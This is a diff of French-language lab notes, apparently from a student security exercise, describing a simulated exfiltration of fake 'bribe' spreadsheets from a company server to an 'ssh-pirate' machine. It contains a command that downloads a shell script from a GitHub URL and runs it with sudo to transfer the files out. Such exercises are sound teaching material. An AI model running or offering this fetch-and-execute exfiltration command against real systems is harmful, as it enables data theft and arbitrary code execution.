@@ -188,7 +188,7 @@ quit
 
 
 A9) 
-- côté poste/web : préparation :
+- côté poste : préparation :
 
 ```bash
 echo 'byebye' > pots_de_vin1.xlsx  
@@ -198,12 +198,16 @@ echo 'hinataestnul' > pots_de_vinnaruto.xlsx
 
 
 - côté ssh-pirate : préparation : 
+
+```bash
 cd /home/etudiant && mkdir /home/etudiant/data
 
 ssh $srv_entreprise
+```
+
 
 - serveur entreprise : mise en place du transfert : vers ssh-pirate
-curl https://raw.githubusercontent.com/amineAUPEC/kajan/main/scp_transf.sh > exfiltration.sh && sudo chmod +x exfiltration.sh && sudo ./exfiltration.sh
+`curl https://raw.githubusercontent.com/amineAUPEC/kajan/main/scp_transf.sh > exfiltration.sh && sudo chmod +x exfiltration.sh && sudo ./exfiltration.sh`
 
 
 
